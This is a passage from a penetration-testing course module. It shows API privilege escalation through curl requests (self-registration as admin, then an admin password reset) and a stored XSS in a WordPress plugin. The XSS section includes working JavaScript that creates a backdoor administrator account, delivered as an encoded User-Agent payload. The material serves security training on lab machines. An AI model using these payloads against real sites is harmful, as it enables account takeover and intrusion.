Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 10:58:51 GMT

{
  "detail": "The method is not allowed for the requested URL.",
  "status": 405,
  "title": "Method Not Allowed",
  "type": "about:blank"
}
```

> Listing 13 - Discovering API unsupported methods

Interestingly, instead of a _404 Not Found_ response code, we received a _405 METHOD NOT ALLOWED_, implying that the requested URL is present, but that our HTTP method is unsupported. By default, curl uses the GET method when it performs requests, so we could try interacting with the **password** API through a different method, such as POST or PUT.

Both POST and PUT methods, if permitted on this specific API, could allow us to override the user credentials (in this case, the administrator password).

Before attempting a different method, let's verify if the overwritten credentials are accepted. We can check if the _login_ method is supported by extending our base URL as follows:

```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/login
HTTP/1.0 404 NOT FOUND
Content-Type: application/json
Content-Length: 48
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 12:04:30 GMT

{ "status": "fail", "message": "User not found"}
```

> Listing 14 - Inspecting the 'login' API

Although we were presented with a _404 NOT FOUND_ message, the status message states that the user has not been found; another clear sign that the API itself exists. We only need to find a proper way to interact with it.

We know one of the usernames is _admin_, so we can attempt a login with this username and a dummy password to verify that our strategy makes sense.

Next, we will try to convert the above GET request into a POST and provide our payload in the required [_JSON_](https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Objects/JSON) format. Let's craft our request by first passing the admin username and dummy password as JSON data via the **-d** parameter. We'll also specify "json" as the "Content-Type" by specifying a new header with **-H**.

```
kali@kali:~$ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{ "status": "fail", "message": "Password is not correct for the given username."}
```

> Listing 15 - Crafting a POST request against the login API

The API return message shows that the authentication failed, meaning that the API parameters are correctly formed.

Since we don't know admin's password, let's try another route and check whether we can register as a new user. This might lead to a different attack surface.

Let's try registering a new user with the following syntax by adding a JSON data structure that specifies the desired username and password:

```
kali@kali:~$curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register

{ "status": "fail", "message": "'email' is a required property"}
```

> Listing 16 - Attempting new User Registration

The API replied with a "fail" message stating that we should also include an email address. We could take this opportunity to determine if there's any administrative key we can abuse. Let's add the _admin_ key, followed by a _True_ value.

```
kali@kali:~$curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}
```

> Listing 17 - Attempting to register a new user as admin

Since we received no error, it seems we were able to successfully register a new user as an admin, which should not be permitted by design. Next, let's try to log in with the credentials we just created by invoking the **login** API we discovered earlier.

```
kali@kali:~$curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}
```

> Listing 18 - Logging in as an admin user

We were able to correctly sign in and retrieve a [_JSON Web Token_](https://en.wikipedia.org/wiki/JSON_Web_Token) (JWT) authentication token. To obtain tangible proof that we are an administrative user, we should use this token to change the admin user password.

We can attempt this by forging a POST request that targets the **password** API.

```
kali@kali:~$ curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'

{
  "detail": "The method is not allowed for the requested URL.",
  "status": 405,
  "title": "Method Not Allowed",
  "type": "about:blank"
}
```

> Listing 19 - Attempting to Change the Administrator Password via a POST request

We passed the JWT key inside the _Authorization_ header along with the new password.

Unfortunately, the application indicates that the HTTP method is unsupported, so we’ll try an alternative. The PUT method (along with PATCH) is often used to replace a value as opposed to creating one via a POST request, so let's try to explicitly define it next:

```
kali@kali:~$ curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```

> Listing 20 - Attempting to Change the Administrator Password via a PUT request

This time we received no error message, so we can assume the application backend processed the request without error. To prove that our attack succeeded, we can try logging in as admin using the newly changed password.

```
kali@kali:~$ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwic3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0", "message": "Successfully logged in.", "status": "success"}
```

> Listing 21 - Successfully logging in as the admin account

Nice! We managed to take over the admin account by exploiting a logical privilege escalation bug present in the registration API.

These kind of programming mistakes happen to various degrees when building web applications that rely on custom APIs, often due to lack of testing and secure coding best practices.

So far, we have relied on curl to manually assess the target's API so that we could get a better sense of the entire traffic flow.

This approach, however, will not properly scale whenever the number of APIs becomes significant. Luckily, we can recreate all the above steps from within Burp.

As an example, let's replicate the latest admin login attempt and send it to the proxy by appending the _--proxy 127.0.0.1:8080_ to the command. Once done, from Burp's _Repeater_ tab, we can create a new empty request and fill it with the same data as we did previously.

![Figure 23: Crafting a POST request in Burp for API testing](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/52e79b4472fa121dd7d260386dc6a9f7-webenum_api01.png)

Figure 23: Crafting a POST request in Burp for API testing

Next, we'll click on the _Send_ button and verify the incoming response on the right pane.

![Figure 24: Inspecting the API response value](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/95e7f350565cf4049f29a9636984b47b-webenum_api02.png)

Figure 24: Inspecting the API response value

Great! We were able to recreate the same behavior within our proxy, which, among other advantages, enables us to store any tested APIs in its database for later investigation.

Once we've tested several different APIs, we could navigate to the _Target_ tab and then _Site map_. We can then retrieve the entire map of the paths we have been testing so far.

![Figure 18: Using the Site Map to organize API testing](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/74035e000cf0b222b649385e049747f2-webenum_api03.png)

Figure 18: Using the Site Map to organize API testing

From Burp's Site map, we can track the API we discovered and forward any saved request to the Repeater or Intruder for further testing.

In this Learning Unit, we explored how to debug web applications through the web browser console and network developer tools. We then learned what REST APIs are, their role in web applications, and how we can approach a black-box penetration test to find weaknesses and abuse them.

Now that we’ve developed a solid understanding of how to map a web application’s structure and identify its components, we’re ready to explore how these findings can lead to exploitation. We’ll begin with one of the most common — and dangerous — vulnerabilities: Cross-Site Scripting.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

|   |   |   |
|---|---|---|
|Web Application Enumeration - Walkthrough VM #1|||
|Web Application Enumeration - Walkthrough VM #2|||
|Web Application Enumeration - Exercise VM #1|||
|Web Application Enumeration - Exercise VM #2|||
|Web Application Enumeration - Exercise VM #3|||
|Web Application Enumeration - Exercise VM #4|||

#### Labs

1. Start up the _Walkthrough VM 1_ and modify the Kali **/etc/hosts** file to reflect the provided dynamically-allocated IP address that has been assigned to the _offsecwp_ instance.

Use Firefox to get familiar with the Developer Debugging Tools by navigating to the _offsecwp_ site and replicate the steps shown in this Learning Unit.

Explore the entire WordPress website and inspect its HTML source code in order to find the flag.

Answer[View hints](https://portal.offsec.com/courses/pen-200-44065/learning/introduction-to-web-application-attacks-44516/web-application-enumeration-44557/inspecting-http-response-headers-and-sitemaps-44527#)

2. Start _Walkthrough VM 2_ and replicate the curl command we learned in this section in order to map and exploit the vulnerable APIs.

Next, perform a brute force attack to discover another API that has a same pattern as **/users/v1**.

Then, perform a query against the base path of the new API: what's the name of the item belonging to the _admin_ user?

NOTE: A dirbuster wordlist should help on this task.

Answer[View hints](https://portal.offsec.com/courses/pen-200-44065/learning/introduction-to-web-application-attacks-44516/web-application-enumeration-44557/inspecting-http-response-headers-and-sitemaps-44527#)

3. This website running on the Exercise VM 1 is dedicated to all things maps! Follow the maps to get the flag.

Answer[View hints](https://portal.offsec.com/courses/pen-200-44065/learning/introduction-to-web-application-attacks-44516/web-application-enumeration-44557/inspecting-http-response-headers-and-sitemaps-44527#)

4. Inspect the Exercise VM 2 web application URL and notice if anything is interesting at the URL level.

Answer[View hints](https://portal.offsec.com/courses/pen-200-44065/learning/introduction-to-web-application-attacks-44516/web-application-enumeration-44557/inspecting-http-response-headers-and-sitemaps-44527#)

5. We made another website, but something is wrong. The site is available at Exercise VM 3, but it keeps giving some weird, non-standard responses. Check out the HTTP headers that accompany this site.

Answer[View hints](https://portal.offsec.com/courses/pen-200-44065/learning/introduction-to-web-application-attacks-44516/web-application-enumeration-44557/inspecting-http-response-headers-and-sitemaps-44527#)

6. We made this cool website dedicated to the three web amigos: HTML, CSS, and JavaScript. It is available at the web root on the Exercise VM 4. Closely review each of the three friends to find the flag for this challenge.

Answer[View hints](https://portal.offsec.com/courses/pen-200-44065/learning/introduction-to-web-application-attacks-44516/web-application-enumeration-44557/inspecting-http-response-headers-and-sitemaps-44527#)

## 8.4. Cross-Site Scripting

This Learning Unit covers the following Learning Objectives:

- Understand cross-site scripting vulnerability types
- Exploit basic cross-site scripting
- Perform privilege escalation via cross-site scripting

One of the most important features of a well-defended web application is [_data sanitization_](https://en.wikipedia.org/wiki/Data_validation), a process in which user input is processed so that all dangerous characters or strings are removed or transformed. Unsanitized data allows an attacker to inject, and potentially execute, malicious code.

[_Cross-Site Scripting_](https://owasp.org/www-community/attacks/xss/) (XSS) is a vulnerability that exploits a user's trust in a website by dynamically injecting content into the page rendered by the user's browser.

Once thought to be a relatively low-risk vulnerability, XSS today is both high-risk and prevalent, allowing attackers to inject client-side scripts, such as JavaScript, into web pages visited by other users.

## 8.4.1. Stored vs Reflected XSS Theory

XSS vulnerabilities can be grouped into two major classes:

- [_Stored_](https://en.wikipedia.org/wiki/Cross-site_scripting#Persistent_\(or_stored\))
- [_Reflected_](https://en.wikipedia.org/wiki/Cross-site_scripting#Non-persistent_\(reflected\))

_Stored XSS attacks_, also known as _Persistent XSS_, occur when the exploit payload is stored in a database or otherwise cached by a server. The web application then retrieves this payload and displays it to anyone who visits a vulnerable page. A single Stored XSS vulnerability can therefore attack all site users. Stored XSS vulnerabilities often exist in forum software, especially in comment sections, in product reviews, or wherever user content can be stored and reviewed later.

_Reflected XSS attacks_ usually include the payload in a crafted request or link. The web application takes this value and places it into the page content. This XSS variant only attacks the person submitting the request or visiting the link. Reflected XSS vulnerabilities often occur in search fields and results, as well as anywhere user input is included in error messages.

Either of these two vulnerability variants can manifest as client- (browser) or server-side; they can also be _DOM-based_.

[_DOM-based XSS_](https://en.wikipedia.org/wiki/Cross-site_scripting#Server-side_versus_DOM-based_vulnerabilities) takes place solely within the page's [_Document Object Model_](https://en.wikipedia.org/wiki/Document_Object_Model) (DOM). While we won't cover too much detail for now, we should know that browsers parse a page's HTML content and then generate an internal DOM representation. This type of XSS occurs when a page's DOM is modified with user-controlled values. DOM-based XSS can be stored or reflected; the key distinction is that DOM-based XSS attacks occur when a browser parses the page's content and inserted JavaScript is executed.

No matter how the XSS payload is delivered and executed, the injected scripts run under the context of the user visiting the affected page. This means that the user's browser, not the web application, executes the XSS payload. These attacks can be nevertheless significant, with impacts including session hijacking, forced redirection to malicious pages, execution of local applications as that user, or even trojanized web applications. In the following sections, we will explore some of these attacks.

## 8.4.2. JavaScript Refresher

JavaScript is a high-level programming language that has become one of the main components of modern web applications. All modern browsers include a JavaScript engine that runs JavaScript code from within the browser itself.

When a browser processes a server's HTTP response containing HTML, the browser creates a DOM tree and renders it. The DOM is comprised of all forms, inputs, images, etc. related to the web page.

JavaScript's role is to access and modify the page's DOM, resulting in a more interactive user experience. From an attacker's perspective, this also means that if we can inject JavaScript code into the application, we can access and modify the page's DOM. With access to the DOM, we can redirect login forms, extract passwords, and steal session cookies.

Like many other programming languages, JavaScript can combine a set of instructions into a [_function_](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Functions).

```
function multiplyValues(x,y) {
  return x * y;
}
 
let a = multiplyValues(3, 5)
console.log(a)
```

> Listing 22 - Simple JavaScript Function

In Listing 22, we declared a function named _multiplyValues_ on lines 1-3 that accepts two integer values as parameters and returns their product.

On line 5, we invoke _multiplyValues_ by passing two integer values, 3 and 5, as parameters, and assigning the variable _a_ to the value returned by the function.

When declaring the _"a"_ variable, we don't assign just any type to the variable, since JavaScript is a [_loosely typed_ language](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures). This means that the actual type of the _"a"_ variable is inferred as a Number type based on the type of the invoked function arguments, which are Number types. Finally, on line 6 we print the value of _"a"_ to the console.

We can verify the above code by opening the developer tools in Firefox on the **about:blank** page to avoid clutter originated by any extra loaded library.

Once the blank page is loaded, we'll click on the _Web Console_ from the Web Developer sub-menu in the Firefox Menu or use the shortcut C+B+k.

![Figure 25: Testing the JavaScript Function in the Browser Console](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/89c0b15a538a12feb35cdbecff45908b-xss1.png)

Figure 25: Testing the JavaScript Function in the Browser Console

From within the Console, we can execute our test function and retrieve the output.

Printing values to the browser's console is another technique we can add to our debugging toolkit that will be extremely useful when analyzing more complex JavaScript code.

## 8.4.3. Identifying XSS Vulnerabilities

We can find potential entry points for XSS by examining a web application and identifying input fields (such as search fields) that accept unsanitized input, which is then displayed as output in subsequent pages.

Once we identify an entry point, we can input special characters and observe the output to determine if any of the special characters return unfiltered.

The most common special characters used for this purpose include:

```
< > ' " { } ;
```

> Listing 23 - Special characters for HTML and JavaScript

Let's describe the purpose of these special characters. HTML uses "<" and ">" in markup syntax to denote [_elements_](https://en.wikipedia.org/wiki/HTML_element), the various components that make up an HTML document. JavaScript uses "{" and "}" in function declarations. Single (') and double (") quotes are used to denote strings, and semicolons (;) are used to mark the end of a statement.

If the application does not remove or encode these characters, it may be vulnerable to XSS because the app _interprets_ the characters as code, which in turn, enables additional code.

While there are multiple types of encoding, the most common we'll encounter in web applications are [_HTML encoding_](https://en.wikipedia.org/wiki/Character_encodings_in_HTML#HTML_character_references) and [_URL encoding_](https://en.wikipedia.org/wiki/Percent-encoding), URL encoding, sometimes referred to as _percent encoding_, is used to convert non-ASCII and reserved characters in URLs, such as converting a space to "%20".

HTML encoding (or _character references_) can be used to display characters that normally have special meanings, like tag elements. For example, `&lt;` is the character reference for `\<`. When encountering this type of encoding, the browser will not interpret the character as the start of an element but will display the actual character as-is.

If we can inject these special characters into the page, the browser will treat them as code elements. We can then begin to build code that will be executed in the victim's browser once it loads the maliciously injected JavaScript code.

We may need to use different sets of characters, depending on where our input is being included. For example, if our input is being added between _div_ tags, we'll need to include our own [_script tags_](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script) and need to be able to inject "<" and ">" as part of the payload. If our input is being added within an existing JavaScript tag, we might only need quotes and semicolons to add our own code.

## 8.4.4. Basic XSS

Let's demonstrate basic XSS with a simple attack against the OffSec WordPress instance. The WordPress installation is running a plugin named _Visitors_ that is [_vulnerable to stored XSS_](https://www.exploit-db.com/exploits/49972). The plugin's main feature is to log the website's visitor data, including the IP, source, and User-Agent fields.

The source code for the plugin can be downloaded from its [_website_](https://downloads.wordpress.org/plugin/visitors-app.0.3.zip). If we inspect the **database.php** file, we can verify how the data is stored inside the WordPress database:

```
function VST_save_record() {
	global $wpdb;
	$table_name = $wpdb->prefix . 'VST_registros';

	VST_create_table_records();

	return $wpdb->insert(
				$table_name,
				array(
					'patch' => $_SERVER["REQUEST_URI"],
					'datetime' => current_time( 'mysql' ),
					'useragent' => $_SERVER['HTTP_USER_AGENT'],
					'ip' => $_SERVER['HTTP_X_FORWARDED_FOR']
				)
			);
}
```

> Listing 24 - Inspecting Visitor Plugin Record Creation Function

This PHP function is responsible for parsing various HTTP request headers, including the User-Agent, which is saved in the _useragent_ record value.

Next, each time a WordPress administrator loads the Visitor plugin, the function will execute the following portion of code from **start.php**:

```
$i=count(VST_get_records($date_start, $date_finish));
foreach(VST_get_records($date_start, $date_finish) as $record) {
    echo '
        <tr class="active" >
            <td scope="row" >'.$i.'</td>
            <td scope="row" >'.date_format(date_create($record->datetime), get_option("links_updated_date_format")).'</td>
            <td scope="row" >'.$record->patch.'</td>
            <td scope="row" ><a href="https://www.geolocation.com/es?ip='.$record->ip.'#ipresult">'.$record->ip.'</a></td>
            <td>'.$record->useragent.'</td>
        </tr>';
    $i--;
}
```

> Listing 25 - Inspecting Visitors Plugin Record Visualization Function

From the above code, we'll notice that the _useragent_ record value is retrieved from the database and inserted plainly in the Table Data (_td_) HTML tag, without any sort of data sanitization.

As the User-Agent header is under user control, we could craft an XSS attack by inserting a script tag invoking the _alert()_ method to generate a pop-up message. Given the immediate visual impact, this method is very commonly used to verify that an application is vulnerable to XSS.

Info

Although we just performed a white-box testing approach, we could have discovered the same vulnerability by testing the plugin through black-box HTTP header fuzzing.

With Burp configured as a proxy and Intercept disabled, we can start our attack by first browsing to **http://offsecwp/** using Firefox.

We'll then go to Burp _Proxy_ > _HTTP History_, right-click on the request, and select _Send to Repeater_.

![Figure 26: Forwarding the request to the Repeater](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/e113a6b758f58011df96c74634acfe7a-xss2.png)

Figure 26: Forwarding the request to the Repeater

Moving to the _Repeater_ tab, we can replace the default User-Agent value with the a script tag that includes the alert method (**<script>alert(42)</script>**), then send the request.

![Figure 27: Forwarding the request to the Repeater](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/4c19765da365cf9670d55561426a85d6-xss3.png)

Figure 27: Forwarding the request to the Repeater

If the server responds with a _200 OK_ message, we should be confident that our payload is now stored in the WordPress database.

To verify this, let's log in to the admin console at **http://offsecwp/wp-login.php** using the _admin/password_ credentials.

If we navigate to the Visitors plugin console at **http://offsecwp/wp-admin/admin.php?page=visitors-app%2Fadmin%2Fstart.php**, we are greeted with a pop-up banner showing the number 42, proving that our code injection worked.

![Figure 28: Demonstrating the XSS vulnerability](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/e425b9f0955de47c2a7449749956d4d9-xss4.png)

Figure 28: Demonstrating the XSS vulnerability

Excellent. We have injected an XSS payload into the web application's database and it will be served to any administrator that loads the plugin. A simple alert window is a somewhat trivial example of what can be done with XSS, so let’s try something more interesting, like creating a new administrative account.

## 8.4.5. Privilege Escalation via XSS

Since we are now capable of storing JavaScript code inside the target WordPress application and having it executed by the admin user when loading the page, we're ready to get more creative and explore different avenues for obtaining administrative privileges.

We could leverage our XSS to steal [_cookies_](https://en.wikipedia.org/wiki/HTTP_cookie) and session information if the application uses an insecure session management configuration. If we can steal an authenticated user's cookie, we could masquerade as that user within the target web site.

Websites use cookies to track [_state_](https://en.wikipedia.org/wiki/Session_\(computer_science\)) and information about users. Cookies can be set with several optional flags, including two that are particularly interesting to us as penetration testers: _Secure_ and _HttpOnly_.

The [_Secure_](https://en.wikipedia.org/wiki/Secure_cookie) flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS. This protects the cookie from being sent in clear text and captured over the network.

The [_HttpOnly_](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies) flag instructs the browser to deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.

Let's verify the nature of WordPress' session cookies by first logging in as the _admin_ user.

Next, we can open the Web Developer Tools, navigate to the _Storage_ tab, then click on _http://offsecwp_ under the _Cookies_ menu on the left.

![Figure 29: Inspecting WordPress Cookies](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/726cdb96ca41edf13970f3204c6e9335-xss5.png)

Figure 29: Inspecting WordPress Cookies

We notice that our browser has stored six different cookies, but only four are session cookies. Of these four cookies, if we exclude the negligible _wordpress_test_cookie_, all support the HttpOnly feature.

Since all the session cookies can be sent only via HTTP, unfortunately, they also cannot be retrieved via JavaScript through our attack vector. We'll need to find a new angle.

When the admin loads the Visitors plugin dashboards that contains the injected JavaScript, it executes whatever we provided as a payload, be it an alert pop-up banner or a more complex JavaScript function.

For instance, we could craft a JavaScript function that adds another WordPress administrative account, so that once the real administrator executes our injected code, the function will execute behind the scenes.

To succeed with our attack angle, we need to cover another web application attack class.

To develop this attack, we'll build a similar scenario as depicted by [_Shift8_](https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/). First, we'll create a JS function that fetches the WordPress admin [_nonce_](https://developer.wordpress.org/reference/functions/wp_nonce_field/).

The nonce is a server-generated token that is included in each HTTP request to add randomness and prevent [_Cross-Site-Request-Forgery_](https://owasp.org/www-community/attacks/csrf) (CSRF) attacks.

A CSRF attack occurs via social engineering in which the victim clicks on a malicious link that performs a preconfigured action on behalf of the user.

The malicious link could be disguised by an apparently harmless description, often luring the victim to click on it.

```
<a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000"">Check out these awesome cat memes!</a>
```

> Listing 26 - CSRF example attack

In the above example, the URL link is pointing to a Fake Crypto Bank website API, which performs a bitcoin transfer to the attacker account. If this link was embedded into the HTML code of an email, the user would be only able to see the link description, but not the actual HTTP resource it is pointing to. This attack would be successful if the user is already logged in with a valid session on the same website.

In our case, by including and checking the pseudo-random nonce, WordPress prevents this kind of attack, since an attacker could not have prior knowledge of the token. However, as we'll soon explain, the nonce won't be an obstacle for the stored XSS vulnerability we discovered in the plugin.

As mentioned, to perform any administrative action, we need to first gather the nonce. We can accomplish this using the following JavaScript function:

```
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

> Listing 27 - Gathering WordPress Nonce

This function performs a new HTTP request towards the **/wp-admin/user-new.php** URL and saves the nonce value found in the HTTP response based on the regular expression. The regex pattern matches any alphanumeric value contained between the string _/ser" value="_ and double quotes.

Now that we've dynamically retrieved the nonce, we can craft the main function responsible for creating the new admin user.

```
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

> Listing 28 - Creating a New WordPress Administrator Account

Highlighted in this function is the new backdoored admin account, just after the nonce we obtained previously. If our attack succeeds, we'll be able to gain administrative access to the entire WordPress installation.

To ensure that our JavaScript payload will be handled correctly by Burp and the target application, we need to first minify it, then encode it.

To minify our attack code into a one-liner, we can navigate to [_JS Compress_](https://jscompress.com/).

![Figure 30: Minifying the XSS attack code](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/2a2f4dbcc913552bb7d442fa94655ba3-xss6.png)

Figure 30: Minifying the XSS attack code

After clicking _Compress JavaScript_, we’ll copy and locally save the minified output.

As a final step, we’ll encode the minified JavaScript code, so any bad characters won't interfere with sending the payload.

We can do this using the following function:

```
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

> Listing 29 - JS Encoding JS Function

The _encode_to_javascript_ function will parse the minified JS string parameter and convert each character into the corresponding UTF-16 integer code using the [_charCodeAt_](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/charCodeAt) method.

Let's run the function from the browser's console.

![Figure 31: Encoding the Minified JS with the Browser Console](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/90fa49369352cbf0dc80ea7dd2c19564-xss7.png)

Figure 31: Encoding the Minified JS with the Browser Console

We are going to decode and execute the encoded string by first decoding the string with the [_fromCharCode_](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode) method, then running it via the [_eval()_](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) method. Once we have copied the encoded string, we can insert it with the following **curl** command and launch the attack:

```
kali@kali:~$ curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
```

> Listing 30 - Launching the Final XSS Attack through Curl

Before running the curl attack command, let's start Burp and leave Intercept on.

We instructed curl to send a specially-crafted HTTP request with a User-Agent header containing our malicious payload, then forward it to our Burp instance so we can inspect it further.

After running the curl command, we can inspect the request in Burp.

![Figure 32: Inspecting the Attack in Burp](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/b0c5559626ac4e29fa8040c431e7aaa8-xss8.png)

Figure 32: Inspecting the Attack in Burp

Everything seems correct, so let's forward the request by clicking _Forward_, then disabling Intercept.

At this point, our XSS exploit should have been stored in the WordPress database. We only need to simulate execution by logging in to the OffSec WP instance as admin, then clicking on the Visitors plugin dashboard on the bottom left.

![Figure 33: Loading Visitors Statistics](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/d64d2d202ef9d66aa74802ab070c77b1-xss9.png)

Figure 33: Loading Visitors Statistics

We notice that only one entry is present, and apparently no User-Agent has been recorded. This is because the User-Agent field contained our attack embedded into "<script>" tags, so the browser cannot render any string from it.

By loading the plugin statistics, we should have executed the malicious script, so let's verify if our attack succeeded by clicking on the _Users_ menu on the left pane.

![Figure 34: Confirming that our Attack Succeeded](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/9d0dac705ec8e4521f66c5b752de9739-xss10.png)

Figure 34: Confirming that our Attack Succeeded

Excellent! This XSS flaw allowed us to escalate privileges from a standard user to an administrator by leveraging a crafted HTTP request.

We could now advance our attack and gain access to the underlying host by crafting a custom WordPress plugin with an embedded web shell. We'll cover web shells more in-depth in another Module.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

XSS - Walkthrough VM #1

XSS - Walkthrough VM #2

XSS - Module Exercise VM #1

#### Labs

1. Start Walkthrough VM 1 and replicate the steps learned in this Learning Unit to identify the basic XSS vulnerability present in the Visitors plugin.

Based on the source code portion we have explored, which other HTTP header might be vulnerable to a similar XSS flaw?

Answer

2. Start Walkthrough VM 2 and replicate the privilege escalation steps we explored in this Learning Unit to create a secondary administrator account.

What is the JavaScript method responsible for interpreting a string as code and executing it? Submit the answer as the method name only, or methodName().

Answer

3. **Capstone Lab**: Start Module Exercise VM 1 and add a new administrative account like we did in this Learning Unit. Next, craft a WordPress plugin that embeds a web shell and exploit it to enumerate the target system.

